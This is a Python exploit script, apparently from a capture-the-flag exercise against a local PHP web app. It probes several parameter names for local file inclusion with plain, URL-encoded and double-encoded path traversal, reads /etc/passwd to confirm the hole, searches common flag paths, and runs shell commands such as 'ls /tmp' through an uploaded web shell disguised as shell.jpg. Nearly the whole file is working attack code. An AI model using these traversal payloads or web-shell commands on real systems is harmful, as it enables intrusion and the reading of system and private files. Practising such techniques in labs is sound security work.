import requests
import os

base_url = "http://127.0.0.1:32824"

print("Testing LFI to read flag files from filesystem...")
print("=" * 60)

# First, let's understand what parameters the index.php accepts
# Try to inject PHP code via the uploaded shell.jpg
print("\n1. Testing parameter injection with uploaded shell...")
test_payloads = [
    f"{base_url}/index.php?file=upload/shell.jpg&cmd=ls",
    f"{base_url}/index.php?include=upload/shell.jpg&cmd=ls",
    f"{base_url}/index.php?page=upload/shell.jpg&cmd=ls"
]

for url in test_payloads:
    resp = requests.get(url)
    print(f"\nTesting URL: {url}")
    if resp.status_code == 200:
        print(f"Status: 200, Length: {len(resp.content)}")
        if len(resp.content) < 1000:
            print(f"Content: {resp.text}")

# Let's try direct file reading via LFI
print("\n2. Testing direct file reading (looking for flags)...")

# Common flag locations
flag_files = [
    "/flag",
    "/flag.txt",
    "/tmp/flag",
    "/tmp/flag.txt",
    "/home/flag",
    "/home/flag.txt",
    "/root/flag",
    "/root/flag.txt",
    "/var/www/flag",
    "/var/www/flag.txt",
    "/etc/flag",
    "/etc/flag.txt",
    "/opt/flag",
    "/opt/flag.txt"
]

# Parameter names to test for LFI
param_names = ['file', 'include', 'page', 'path', 'lang', 'template', 'view', 'load']

for param in param_names:
    print(f"\nTesting parameter: {param}")
    for flag_file in flag_files:
        # Try with different path traversal techniques
        test_paths = [
            flag_file,
            f"../..{flag_file}",
            f"../../..{flag_file}",
            f"..%2f..{flag_file}",  # URL encoded
            f"..%252f..{flag_file}"  # Double URL encoded
        ]
        
        for path in test_paths:
            url = f"{base_url}/index.php?{param}={path}"
            resp = requests.get(url)
            
            if resp.status_code == 200 and len(resp.content) > 100 and 'Invalid Image' not in resp.text:
                # Check if this looks like flag content
                if 'FLAG{' in resp.text:
                    print(f"[!] FLAG FOUND! URL: {url}")
                    print(f"FLAG: {resp.text}")
                elif len(resp.text) < 2000:
                    print(f"[Interesting] {path}: {len(resp.text)} bytes")
                    print(f"  Content: {resp.text[:500]}")

# Try to read /etc/passwd to confirm LFI
print("\n3. Testing LFI with /etc/passwd...")
for param in param_names:
    url = f"{base_url}/index.php?{param}=../../../../etc/passwd"
    resp = requests.get(url)
    if resp.status_code == 200 and 'root:' in resp.text:
        print(f"[LFI CONFIRMED] via parameter: {param}")
        print(f"Content: {resp.text[:500]}")
        
        # Now try to find flag with this parameter
        print("\nTrying to find flag...")
        for flag_file in flag_files:
            flag_url = f"{base_url}/index.php?{param}={flag_file}"
            flag_resp = requests.get(flag_url)
            if flag_resp.status_code == 200 and 'FLAG{' in flag_resp.text:
                print(f"[!] FLAG FOUND: {flag_resp.text}")
                break

# Try to list directories
print("\n4. Trying to list /tmp directory...")
for param in param_names:
    # Try to include directory listing or use shell commands
    list_url = f"{base_url}/index.php?{param}=upload/shell.jpg&cmd=ls%20/tmp"
    resp = requests.get(list_url)
    if resp.status_code == 200 and len(resp.text) < 1000:
        print(f"Command execution test: {resp.text}")

print("\n" + "=" * 60)
print("LFI flag search complete.")
